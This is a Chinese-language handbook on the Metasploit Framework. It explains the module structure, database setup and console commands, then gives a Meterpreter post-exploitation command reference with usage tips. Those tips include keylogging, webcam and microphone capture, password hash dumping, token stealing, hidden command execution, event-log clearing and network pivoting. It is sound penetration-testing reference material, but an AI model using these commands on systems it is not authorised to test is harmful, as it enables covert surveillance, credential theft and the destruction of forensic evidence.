---
title: "Metasploit Framework Handbook"
date: 2020-09-28 15:09:23 +0800
category: 内网渗透
tags: [内网,MSF]
excerpt: Metasploit Framework Handbook
---
https://www.anquanke.com/post/id/209966
# 简介
官网   https://www.rapid7.com/
Github https://github.com/rapid7/metasploit-framework
## 体系结构
| 文件夹 | 作用 | 解释 |
|----|----|----|
| auxiliary | 辅助模块 | Metasploit 为渗透测试的信息搜集环节提供了大量的辅助模块支持，包括针对各种网络服务的扫描与查点、构建虚假服务收集登录密码、口令猜测破解、敏感信息嗅探、探查敏感信息泄露、Fuzz 测试发掘漏洞、实施网络协议欺骗等模块。辅助模块能够帮助渗透测试者在渗透攻击之前取得目标系统丰富的情报信息，从而发起更具目标性的精准攻击。|
| exploits | 渗透攻击模块 | 主动:主动渗透攻击所利用的安全漏洞位于网络服务端软件与服务承载的上层应用程序之中，由于这些服务通常是在主机上开启一些监听端口并等待客户端连接，因此针对它们的渗透攻击可以主动发起，通过连接目标系统网络服务，注入一些特殊构造的包含”邪恶”攻击数据的网络请求内容，触发安全漏洞，并使得远程服务进程执行在”邪恶”数据中包含攻击载荷，从而获取目标系统的控制会话。<br>被动:被动渗透攻击利用的漏洞位于客户端软件中，如浏览器、浏览器插件、电子邮件客户端、Office 与 Adobe 等各种文档阅读与编辑软件。对于这类存在于客户端软件的安全漏洞，我们无法主动地将数据从远程输入到客户端软件中，因此只能采用被动渗透攻击的方式，即构造出”邪恶”的网页、电子邮件或文档文件，并通过架设包含此类恶意内容的服务、发送邮件附件、结合社会工程学分发并诱骗目标用户打开、结合网络欺骗和劫持技术等方式，等目标系统上的用户访问到这些邪恶的内容，从而触发客户端软件中的安全漏洞，给出控制目标系统的 Shell 会话。|
| payloads | 攻击载荷模块 | Metasploit攻击载荷模块分为独立(Singles)比如“windows/shell_bind_tcp”、传输器(Stager)、传输体(Stage) “windows/shell/bind_tcp"是由一个传输器载荷(bind_tcp) 和一个传输体载荷(Shell) 所组成的，其功能等价于独立攻击载荷“windows/shell_bind_tcp"|
| nops | 空指令模块 | 空指令(NOP) 是一些对程序运行状态不会造成任何实质影响的空操作或者无关操作指令，最典型的空指令就是空操作，在 x86 CPU 体系架构平台上的操作码是 0x90 。在渗透攻击构造邪恶数据缓冲区时，常常要在真正要执行的Shellcode之前添加一段空指令区，这样当触发渗透攻击后跳转执行Shellcode 时，有一个较大的安全着陆区，从而避免受到内存地址随机化、返回地址计算偏差等原因造成的Shellcode执行失败，提高渗透攻击的可靠性。Metasploit 框架中的空指令模块就是用来在攻击载荷中添加空指令区，以提高攻击可靠性的组件。 |
| encoders | 编码器模块 |攻击载荷模块与空指令模块组装完成一个指令序列后，在这段指令被渗透攻击模块加入邪恶数据缓冲区交由目标系统运行之前，Metasploit 框架还需要完成一道非常重要的工序 – 编码(Encoding)。如果没有这道工序，渗透攻击可能完全不会奏效，或者中途就被检测到并阻断。这道工序是由编码器模块所完成的。编码器模块的第一个使命是确保攻击载荷中不会出现滲透攻击过程中应加以避免的“坏字符”，这些“坏字符”的存在将导致特殊构造的邪恶数据缓冲区无法按照预期目标完输人到存有漏洞的软件例程中，从而使得渗透攻击触发漏洞之后无法正确执行攻击载荷，达成控制系统的目标。编码器的第二个使命就是对攻击载荷进行”免杀”处理，即逃避反病毒软件、IDS 人侵检测系统和IPS人侵防御系统的检测与阻断。 |
| post | 后渗透攻击模块 | 后渗透攻击模块主要支持在渗透攻击取得目标系统控制权之后，在受控系统中进行各式各样的后渗透攻击动作，比如获取敏感信息、进一步拓展、实施跳板攻击等。在后渗透攻击阶段，Metasploit框架中功能最强大、最具发展前景的模块是Meterpreter，Meterpreter 作为可以被渗透攻击植入到目标系统上执行的一个攻击载荷，除了提供基本的控制会话之外，还集成了大量的后渗透攻击命令与功能，并通过大量的后渗透攻击模块进一步提升它在本地攻击与内网拓展方面的能力。 |
| evasion | 免杀模块 |  免杀模块核心功能对攻击载荷进行”免杀”处理。 |
## 功能阶段
### 情报搜集阶段
Metasploit 一方面通过内建的一系列扫描器与查点辅助模块来获取远程服务器信息，另一方面通过插件机制集成调用 Nmap、Nessus、OpenVAS 等业界著名的开源网络扫描工具，从而具备全面的信息搜集能力，为渗透攻击实施提供必不可少的精确情报。
目标识别与服务枚举,集成插件,漏洞扫描
### 威胁建模阶段
在搜集信息之后，Metasploit 支持一系列数据库命令操作直接将这些信息汇总至PostgreSQL、MySQL、SQLite 数据库中，并为用户提供易用的数据库查询命令，可以帮助渗透测试者对目标系统搜索到的情报进行威胁建模，从中找出最可行的攻击路径。
### 漏洞分析阶段
除了信息搜集环节能够直接扫描出一些已公布的安全漏洞之外，Metasploit 中还提供了大量的协议 Fuzz 测试器与 Web 应用漏洞探测分析模块，支持具有一定水平能力的渗透测试者在实际过程中尝试挖掘出 0Day 漏洞，并对漏洞机理与利用方法进行深入分析，而这将为渗透攻击目标带来更大的杀伤力，并提升渗透测试流程的技术含金量。
### 后渗透攻击阶段
在成功实施渗透攻击并获得目标系统的远程控制权之后，Metasploit 框架中另一个极具威名的工具 Meterpreter 在后渗透攻击阶段提供了强大功能。
Meterpreter 可以看作一个支持多操作系统平台，可以仅仅驻留于内存中并具备免杀能力的高级后门工具，Meterpreter 中实现了特权提升、信息提取、系统监控、跳板攻击与内网拓展等多样化的功能特性，此外还支持一种灵活可扩展的方式来加载额外功能的后渗透攻击模块。
### 报告生成阶段
Metasploit 框架获得的渗透测试结果可以输入至内置数据库中，因此这些结果可以通过数据查询来获取，并辅助渗透测试报告的写作。
商业版的 Metasploit Pro 具备了更加强大的报告生成功能，可以输出 HTML、XML、Word和 PDF 格式的报告。
## 工具管理
### 安装
官方安装Wiki
https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
### 更新
以Debian-kali为例
MSF 安装路径 /usr/share/metasploit-framework，如果使用msf自带的更新组件msfupdate会显示更新失败不再支持
```
Qftm :~/Desktop# msfupdate 
msfupdate is no longer supported when Metasploit is part of the operating
system. Please use 'apt update; apt install metasploit-framework'
Qftm :~/Desktop#
```
使用系统apt包管理工具进行更新
```
sudo apt-get update
sudo apt-get install metasploit-framework
```
###  数据库连接
+ 自动配置连接数据库
启动postgresql数据库服务
```
 → Qftm :~/Desktop# service postgresql status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: inactive (dead)
 → Qftm :~/Desktop# service postgresql start
 → Qftm :~/Desktop# service postgresql status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Wed 2020-06-24 03:24:56 EDT; 3s ago
    Process: 4575 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 4575 (code=exited, status=0/SUCCESS)

Jun 24 03:24:56 Pentesting systemd[1]: Starting PostgreSQL RDBMS...
Jun 24 03:24:56 Pentesting systemd[1]: Started PostgreSQL RDBMS.
 → Qftm :~/Desktop#
```
+ msf连接配置
初始化msfdb
```
→ Qftm ← :~# msfdb init
[+] Starting database
[+] Creating database user 'msf'
为新角色输入的口令: 
再输入一遍: 
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
 → Qftm ← :~#
```
启动MSF查看数据库连接情况
```
→ Qftm :~/Desktop# msfconsole 
[*] Starting persistent handler(s)...
msf5 > 
msf5 > db_status 
[*] Connected to msf. Connection type: postgresql.
msf5 >
```
如果要设置自动登录，需要修改配置文件/usr/share/metasploit-framework/config/database.yml，默认初始化已经配置好了。
```
production:
  adapter: postgresql
  database: msf
  username: msf
  password: n1CV4/9NcMUEvg4x90GhPOV6EfPBX/Ai7gY1a2fNdZQ=
  host: localhost
  port: 5432
  pool: 5
  timeout: 5
```
+ 手工配置连接数据库
启动postgresql数据库服务
```
→ Qftm :~/Desktop# service postgresql status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: inactive (dead)
 → Qftm :~/Desktop# service postgresql start
 → Qftm :~/Desktop# service postgresql status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Wed 2020-06-24 03:24:56 EDT; 3s ago
    Process: 4575 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 4575 (code=exited, status=0/SUCCESS)

Jun 24 03:24:56 Pentesting systemd[1]: Starting PostgreSQL RDBMS...
Jun 24 03:24:56 Pentesting systemd[1]: Started PostgreSQL RDBMS.
 → Qftm :~/Desktop#
```
进入postgresql配置
设置数据库账户密码：postgres:adminp
```
→ Qftm :~/Desktop# sudo -u postgres psql
sudo: unable to resolve host Pentesting: Name or service not known
psql (12.1 (Debian 12.1-2))
Type "help" for help.

postgres=# alter user postgres password 'adminp';
ALTER ROLE
postgres=# q
 → Qftm :~/Desktop#
```
设置账户认证方式
```
 → Qftm :~/Desktop# mousepad /etc/postgresql/12/main/postgresql.conf 
password_encryption = md5        # md5 or scram-sha-256
 → Qftm :~/Desktop#
```
重启数据库服务
```
→ Qftm :~/Desktop# service postgresql restart
 → Qftm :~/Desktop# service postgresql status
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Wed 2020-06-24 03:35:54 EDT; 4s ago
    Process: 4734 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 4734 (code=exited, status=0/SUCCESS)

Jun 24 03:35:54 Pentesting systemd[1]: Starting PostgreSQL RDBMS...
Jun 24 03:35:54 Pentesting systemd[1]: Started PostgreSQL RDBMS.
 → Qftm :~/Desktop#
```
连接数据库
```
→ Qftm :~/Desktop# psql -U postgres -h 127.0.0.1
Password for user postgres: 
psql (12.1 (Debian 12.1-2))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```
新建数据库
```
postgres=# create user msf with password 'adminp' createdb;
ERROR:  role "msf" already exists
postgres=# 
postgres=# create database msf with owner=msf;
ERROR:  database "msf" already exists
postgres=#
```
msf连接配置
启动msf控制台，输入db_status查看数据库连接状态
```
→ Qftm :~/Desktop# msfconsole 
[*] Starting persistent handler(s)...
msf5 > db_status 
[*] Connected to msf. Connection type: postgresql.
msf5 >
```
可以看到数据库已经自动连接上了，如果没有，就需要手动输入以下命令连接
```
msf5 > db_connect msf:adminp@127.0.0.1/msf
```
notes
> msf：数据库名
> adminp：密码
> @：固定格式
> 127.0.0.1：登录地址

如果要设置自动登录，需要修改配置文件/usr/share/metasploit-framework/config/database.yml
```
production:
  adapter: postgresql
  database: msf
  username: msf
  password: n1CV4/9NcMUEvg4x90GhPOV6EfPBX/Ai7gY1a2fNdZQ=
  host: localhost
  port: 5432
  pool: 5
  timeout: 5
```
## 基本命令
启动msf	`msfconsole`
### 命令解读
#### MSF Console Command
```
msf5 > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             帮助手册
    banner        展示Metasploit框架信息
    cd            改变当前工作目录
    color         切换颜色（true|false|auto）
    connect       远程连接-与主机通信
    exit          退出Metasploit终端控制台
    get           获取特定上下文变量的值
    getg          获取一个全局变量的值
    grep          grep另一个命令的输出
    help          帮助手册
    history       查看Metasploit控制台中使用过的历史命令
    load          加载框架中的插件
    quit          退出Metasploit终端控制台
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          保存活动的数据存储
    sessions      显示会话列表和有关会话的信息（sessions -h      列出sessions命令的帮助信息
                                           sessions -i      查看所有的会话（基本信息）
                                           sessions -v      列出所有可用交互会话及会话详细信息
                                           sessions -i id   通过 ID 号，进入某一个交互会话
                                           exit             直接退出会话
                                           background       将会话隐藏在后台
                                           sessions -K      杀死所有存活的交互会话）
    set           设置一个特定的上下文变量（选项）的值
    setg          设置一个全局变量的值
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       查看和操作后台线程
    tips          Show a list of useful productivity tips
    unload        卸载已加载框架插件
    unset         取消设置的一个或多个特定的上下文变量
    unsetg        取消设置的一个或多个全局变量的
    version       查看框架和控制台库版本号
```
#### Module Commands
```
Module Commands
===============

    Command       Description
    -------       -----------
    advanced      显示一个或多个模块的高级（详细）选项
    back          从当前上下文返回（退出当前正在使用的模块，返回原始控制台（模块的配置依然有效））
    clearm        清除该模块的堆栈信息
    info          显示有关一个或多个模块的信息
    listm         显示该模块的堆栈信息
    loadpath      从路径搜索并加载模块
    options       显示一个或多个模块的全局选项信息（option|show option）
    popm          将最新模块弹出堆栈并使其激活
    previous      将先前加载的模块设置为当前模块
    pushm         将活动模块或模块列表推入模块堆栈
    reload_all    从所有定义的模块路径重新加载所有模块
    search        搜索相关模块的名称和描述（search cve:2009 type:exploit platform:-linux）
    show          查看显示给定类型的模块，或所有模块（show exploits|post|nop...）
    use           装载一个渗透攻击或者模块
                    （use ModuleName    use exploit/windows/smb/ms17_010_eternalblue
                      info              查看模块的详细信息
                      options           查看脚本配置选项
                      show options        查看脚本配置选项
                      show targets      显示适用的主机类型
                      set               设置模块选项
                      run                启动脚本
                      exploit           启动脚本）
```
#### Job Commands（作业==运行的模块）
```
Job Commands（作业==运行的模块）
============

    Command       Description
    -------       -----------
    handler       启动有效负载处理程序作为作业进程
    jobs          查看和管理作业进程（查看和管理当前运行的模块）
    kill          关闭|杀死一个作业进程
    rename_job    重命名作业进程
```
#### Resource Script Commands
```
Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        将启动控制台以后要输入的命令保存到文件中（批处理文件）
    resource      运行存储在文件中的命令（运行批处理文件）
```
#### Database Backend Commands
```
Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           分析有关特定地址或地址范围的数据库信息
    db_connect        连接到现有的数据库服务（db_connect msf:adminp@127.0.0.1/msf）
    db_disconnect     断开当前数据库服务
    db_export         导出包含数据库内容的文件
    db_import         导入扫描结果文件（将自动检测文件类型）
    db_nmap           执行nmap并自动记录输出到数据库中（集成的nmap，对nmap的一个封装）
    db_rebuild_cache  重建数据库存储的模块缓存（不建议使用）
    db_remove         删除保存的数据库服务条目
    db_save           将当前数据库服务连接保存为默认值，以便在启动时重新连接
    db_status         显示当前数据库服务状态
    hosts             列出数据库中的所有主机
    loot              列出数据库中的所有战利品
    notes             列出数据库中的所有注释
    services          列出数据库中的所有服务
    vulns             列出数据库中的所有漏洞
    workspace         在数据库工作区之间切换
```
#### Credentials Backend Commands
```
Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         列出数据库中的所有凭据
```
#### Developer Commands
```
Developer Commands
==================

    Command       Description
    -------       -----------
    edit          使用首选编辑器编辑当前模块或文件
    irb           在当前上下文中打开一个交互式Ruby Shell
    log           如果可能，将framework.log显示到页面末尾（查看日志信息）
    pry           在当前模块或框架上打开Pry调试器
    reload_lib    从指定路径重新加载Ruby库文件
```
#### MSF Console Module Command
```
msf5 auxiliary(xxx/xxx/xxx) > help

Auxiliary Commands
==================

    Command       Description
    -------       -----------
    check         检查目标是否存在漏洞
    exploit       run命令的别名
    rcheck        重新加载该辅助模块并检查目标是否存在漏洞
    recheck       rcheck命令的别名
    reload        重新加载该辅助模块（已配置的选项还在）
    rerun         重新加载该辅助模块并运行该模块
    rexploit      rerun命令的别名
    run           运行选中的辅助模块

msf5 exploit(xxx/xxx/xxx) > help

Exploit Commands
================

    Command       Description
    -------       -----------
    check         检查目标是否存在漏洞
    exploit       对目标发起攻击
    rcheck        重新加载该辅助模块并检查目标是否存在漏洞
    recheck       rcheck命令的别名
    reload        重新加载该渗透攻击模块（已配置的选项还在）
    rerun         rexploit命令的别名
    rexploit      重新加载该渗透攻击模块并运行该模块对目标发起攻击
    run           exploit命令的别名

msf5 payload(xxx/xxx/xxx) > help

Payload Commands
================

    Command       Description
    -------       -----------
    check         检查目标是否存在漏洞
    generate      Generates a payload
    reload        从磁盘重新加载当前模块
    to_handler    创建具有指定有效负载的处理程序
```
### 情报搜集
#### 主机发现
Metasploit 中提供了一些辅助模块可用于主机发现，这些模块位于modules/auxiliary/scanner/discovery/ 目录中
```
use auxiliary/scanner/discovery/arp_sweep
use auxiliary/scanner/discovery/empty_udp
use auxiliary/scanner/discovery/ipv6_multicast_ping
use auxiliary/scanner/discovery/ipv6_neighbor
use auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement
use auxiliary/scanner/discovery/udp_probe
use auxiliary/scanner/discovery/udp_sweep
```
#### 端口扫描
一般情况下推荐使用 syn 端口扫描器，因为他的扫描速度较快，结果比较准确且不易被对方察觉。
```
use auxiliary/scanner/portscan/ack        
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/portscan/ftpbounce  
use auxiliary/scanner/portscan/xmas
use auxiliary/scanner/portscan/syn
```
#### 探测服务详细信息
+ 调用执行MSF封装集成的Nmap
Nmap能够很好地与Metasploit渗透测试数据库集成在一起，可以方便地在Metasploit终端中使用db_nmap，该命令是Nmap的一个封装，与Nmap使用方法完全一致，不同的是其执行结果将自动输人到数据库中，所以要使用db_nmap前提需要已连接上postgresql数据库
```
msf5 > db_status 
[*] Connected to msf. Connection type: postgresql.
//查看db_nmap命令帮助信息
msf5 > db_nmap -h
//探测服务详细信息
msf5 > db_nmap -Pn -sV 192.33.6.151
//将数据库中的扫描结果导出
msf5 > db_export -f xml 1
```
#### 服务查点
在 Metasploit 的辅助模块中，有很多用于服务扫描和查点的工具，这些工具通常以`[service_name]_version`命名。该模块可用于遍历网络中包含某种服务的主机，并进一步确定服务的版本。
```
msf5 > search type:auxiliary path:_version
```
#### 口令猜测
同样在 Metasploit 的辅助模块中，有很多用于服务口令猜解的工具，这些工具通常以`[service_name]_login`命名
```
msf5 > search type:auxiliary path:_login
```
#### 网站敏感目录扫描
可以借助 Metasploit 中的 brute_dirs、dir_listing、dir_scanner 等辅助模块来进行网站敏感目录扫描。
他们主要使用暴力猜解的方式工作，注意此处需要提供一个目录字典。
# Meterpreter

## 技术优势
+ 平台通用性
Metasploit 提供了各种主流操作系统和平台上的 Meterpreter 版本，包括 Windows，Linux，BSD 系统，并且同时支持 x86 和 x64 平台。另外，Meterpreter 还提供了基于 Java 和 PHP 的实现，以应用在各种不同的环境中
+ 纯内存工作模式
执行漏洞渗透攻击的时候，会直接装载 Meterpreter 的动态链接库到目标系统进程的内存空间。而不是先将 Meterpreter 上传到磁盘，然后调用Loadlibrary 加载动态链接库来启动Meterpreter。
+ 灵活且加密的通信协议
Meterpreter 还提供了灵活加密的客户端服务通信协议，能够对网络传输进行加密，同时这种通信技术支持灵活的功能扩展。
Meterpreter 的网络通信协议采用 TLV 数据封住格式。
+ 易于扩展
Meterpreter 在功能上来说不是一般的 ShellCode 能比拟的，但如果用户需要一些特殊或者定制的功能，也可以轻易的在 Meterpreter 中添加扩展（或插件）来实现。
### 命令解读
#### Windows
#### Windows下的Meterpreter核心命令
```
Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         帮助手册
    background                将当前会话放置后台
    bg                        background命令的别名
    bgkill                    杀死meterpreter后台运行的脚本
    bglist                    列出meterpreter后台运行的脚本
    bgrun                     在后台运行一个meterpreter脚本
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  关闭Unicode字符串的编码
    enable_unicode_encoding   启用Unicode字符串的编码
    exit                      关闭退出 meterpreter session
    get_timeouts              查看当前会话超时信息
    guid                      查看会话GUID
    help                      帮助手册
    info                      展示post模块信息
    irb                       在当前会话中打开一个交互式的Ruby shell
    load                      加载一个或多个meterpreter扩展
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   进程迁移（将Meterpreter会话移植到指定pid值进程中）
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      关闭退出 meterpreter session
    read                      Reads data from a channel
    resource                  运行存储在文件中的命令（运行批处理文件）
    run                       执行一个 meterpreter 脚本 或 Post 模块
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  快速切换到另一个会话中（sessions -i ID）
    set_timeouts              设置当前会话超时信息
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       "load"的别名（已弃用）
    uuid                      获取当前会话的uuid信息
    write                     Writes data to a channel
```
#### 文件系统命令
```
Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           读取会话系统中某一个文件的内容并显示
    cd            改变当前目录
    checksum      检索文件的校验和
    cp            文件复制操作
    dir           列出当前目录下的文件 (ls的别名)
    download      从当前目录下载某一个文件
    edit          编辑文件
    getlwd        打印本地当前工作目录
    getwd         打印工作目录
    lcd           改变本地工作目录
    lls           列出本地目录下的文件
    lpwd          打印本地当前工作目录
    ls            列出目录下所有文件
    mkdir         创建文件夹
    mv            移动文件
    pwd           打印当前工作目录
    rm            删除某个特殊文件
    rmdir         删除某个目录
    search        搜索文件
    show_mount    List all mount points/logical drives
    upload        上传文件或一个目录
```
#### 网络命令
```
Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           显示ARP缓存
    getproxy      查看当前代理配置
    ifconfig      查看网络接口信息
    ipconfig      查看网络接口信息
    netstat       查看网络连接情况
    portfwd       端口转发
    resolve       Resolve a set of host names on the target
    route         查看和修改路由表
```
#### 系统命令
```
Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       清除windows中的应用程序日志、系统日志、安全日志
    drop_token    Relinquishes any active impersonation token.
    execute       执行一个命令
    getenv        获取一个或多个换几个环境变量
    getpid        获取当前会话进程ID(pid)
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        查看权限
    kill          杀死进程（kill <pid>）
    localtime     获取目标系统当前日期和时间
    pgrep         通过名字(特定字符串)查询相关进程
    pkill         通过进程名关闭进程
    ps            查询列出当前运行的进程信息
    reboot        重启远程计算机
    reg           修改远程计算机注册表
    rev2self      Calls RevertToSelf() on the remote machine
    shell         进入目标系统交互式shell终端
    shutdown      将远程计算机关机
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       获取远程计算机系统详细信息
```
#### 用户接口命令
```
Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   查看所有可用的桌面
    getdesktop     获取当前meterpreter关联的桌面
    idletime       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   导出键盘记录数据
    keyscan_start  开始键盘记录
    keyscan_stop   关闭键盘记录
    mouse          Send mouse events
    screenshare    查看远程用户桌面信息
    screenshot     捕获目标屏幕快照信息(截屏)
    setdesktop     设置meterpreter关联的桌面
    uictl          开启或禁止键盘/鼠标（uictl disable/enable keyboard/mouse/all）
```
#### 网络摄像头命令
```
    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    开启视频聊天
    webcam_list    查看摄像头
    webcam_snap    通过摄像头拍照
    webcam_stream  通过摄像头开启视频
```
#### 视频播放命令
```
    Command       Description
    -------       -----------
    play          从目标系统播放音频
```
#### 提权命令
```
Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     尝试去提权
```
#### 密码捕获命令
```
Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      查看SAM数据库信息
```
#### 时间戳命令
```
Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     操纵文件MACE属性
```
#### Linux
#### 核心命令
```
Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         帮助手册
    background                将当前会话放置后台
    bg                        background命令的别名
    bgkill                    杀死meterpreter后台运行的脚本
    bglist                    列出meterpreter后台运行的脚本
    bgrun                     在后台运行一个meterpreter脚本
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  关闭Unicode字符串的编码
    enable_unicode_encoding   启用Unicode字符串的编码
    exit                      关闭退出 meterpreter session
    get_timeouts              查看当前会话超时信息
    guid                      查看会话GUID
    help                      帮助手册
    info                      展示post模块信息
    irb                       在当前会话中打开一个交互式的Ruby shell
    load                      加载一个或多个meterpreter扩展
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   进程迁移（将Meterpreter会话移植到指定pid值进程中）
    pry                       Open the Pry debugger on the current session
    quit                      关闭退出 meterpreter session
    read                      Reads data from a channel
    resource                  运行存储在文件中的命令（运行批处理文件）
    run                       执行一个 meterpreter 脚本 或 Post 模块
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  快速切换到另一个会话中（sessions -i ID）
    set_timeouts              设置当前会话超时信息
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       "load"的别名（已弃用）
    uuid                      获取当前会话的uuid信息
    write                     Writes data to a channel
```
#### 文件系统命令
```
Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           读取会话系统中某一个文件的内容并显示
    cd            改变当前目录
    checksum      检索文件的校验和
    cp            文件复制操作
    dir           列出当前目录下的文件 (ls的别名)
    download      从当前目录下载某一个文件
    edit          编辑文件
    getlwd        打印本地当前工作目录
    getwd         打印工作目录
    lcd           改变本地工作目录
    lls           列出本地目录下的文件
    lpwd          打印本地当前工作目录
    ls            列出目录下所有文件
    mkdir         创建文件夹
    mv            移动文件
    pwd           打印当前工作目录
    rm            删除某个特殊文件
    rmdir         删除某个目录
    search        搜索文件
    upload        上传文件或一个目录
```
#### 网络命令
```
Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    portfwd       端口转发
```
#### 系统命令
```
Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    execute       执行一个命令
    getenv        获取一个或多个换几个环境变量
    getpid        获取当前会话进程ID(pid)
    getuid        查看权限
    kill          杀死进程（kill <pid>）
    localtime     获取目标系统当前日期和时间
    pgrep         通过名字(特定字符串)查询相关进程
    pkill         通过进程名关闭进程
    ps            查询列出当前运行的进程信息
    shell         进入目标系统交互式shell终端
    sysinfo       获取远程计算机系统详细信息
```
#### 视频播放命令
```
Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          从目标系统播放音频
```
## 实战攻略
### 基本系统操作指令
#### 指令指南
```
 Command                   Description
    -------                   -----------
    background                将当前会话放置后台
    bg                        background命令的别名
    exit/quit                 关闭退出 meterpreter session
    info                      展示post模块信息
    load                      加载一个或多个meterpreter扩展
    run                       执行一个 meterpreter 脚本 或 Post 模块
    sessions                  快速切换到另一个会话中（sessions -i ID）
    use                       "load"的别名（已弃用）
    getuid                      查看权限
    kill                        杀死进程（kill <pid>）
    pgrep                      通过名字(特定字符串)查询相关进程
    pkill                      通过进程名关闭进程
    ps                        查询列出当前运行的进程信息
    reboot                    重启远程计算机
    shell                     进入目标系统交互式shell终端
    shutdown                    将远程计算机关机
    sysinfo                    获取远程计算机系统详细信息
```
#### 键盘&鼠标操作
+ 指令指南
```
uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标
uictl disable mouse  #禁用鼠标
uictl disable keyboard  #禁用键盘
```
+ 键盘记录
注意：这里需要监控什么账户的键盘记录就需要将会话进程切换到什么账户权限中，这里原本权限是system为了监控root用户键盘记录，所以进行进程的迁移
```
keyscan_start  #开始键盘记录
keyscan_dump   #导出记录数据
keyscan_stop  #结束键盘记录
```
#### 摄像头操作
```
webcam_list     #查看摄像头
webcam_snap     #通过摄像头拍照
webcam_stream   #通过摄像头开启视频监控(以网页形式进行监控==直播）
webcam_chat     #通过摄像头开启视频聊天（对方有弹窗）
```
#### 进程操作
+ 查看目标机进程信息
```
meterpreter > ps
```
+ 进程迁移
```
getpid                # 获取当前进程的pid
ps                   # 查看当前活跃进程
migrate <pid值>     #将Meterpreter会话移植到指定pid值进程中
kill <pid值>         #杀死进程
```
+ 执行文件操作
```
execute #在目标机中执行文件
execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互
```
+ 清除日志
```
clearav  #清除windows中的应用程序日志、系统日志、安全日志
```
+ 文件操作
```
 Command       Description
    -------       -----------
    cat           读取会话系统中某一个文件的内容并显示
    cd            改变当前目录
    checksum      检索文件的校验和
    cp            文件复制操作
    dir           列出当前目录下的文件 (ls的别名)
    download      从当前目录下载某一个文件
    edit          编辑文件
    getlwd        打印本地当前工作目录
    getwd         打印工作目录
    lcd           改变本地工作目录
    lls           列出本地目录下的文件
    lpwd          打印本地当前工作目录
    ls            列出目录下所有文件
    mkdir         创建文件夹
    mv            移动文件
    pwd           打印当前工作目录
    rm            删除某个特殊文件
    rmdir         删除某个目录
    search        搜索文件
    show_mount    List all mount points/logical drives
    upload        上传文件或一个目录
```
+ 基本网络操作指令
```
 Command       Description
    -------       -----------
    arp           显示ARP缓存
    getproxy      查看当前代理配置
    ifconfig      查看网络接口信息
    ipconfig      查看网络接口信息
    netstat       查看网络连接情况（netstat -ano）
    route         查看和修改路由表
```
+ 路由转发
autoroute添加路由
```
run autoroute -h #查看帮助
run get_local_subnets            #查看目标内网网段地址
run autoroute -s 192.168.9.0/24  #添加到目标环境网络
run autoroute -p  #查看添加的路由
```
+ 系统代理
```
msf5 > use auxiliary/server/socks5 
```
### 后渗透模块

+ 查看post模块信息收集脚本
```
ls /usr/share/metasploit-framework/modules/post/windows/gather/
ls /usr/share/metasploit-framework/modules/post/linux/gather/
```
+ 常用的信息收集脚本
```
run post/windows/gather/arp_scanner 参数 #查看内网主机
run post/windows/gather/checkvm #是否虚拟机
run post/linux/gather/checkvm #是否虚拟机
run post/windows/gather/forensics/enum_drives #查看分区
run post/windows/gather/enum_applications #获取安装软件信息
run post/windows/gather/dumplinks   #获取最近的文件操作
run post/windows/gather/enum_ie  #获取IE缓存
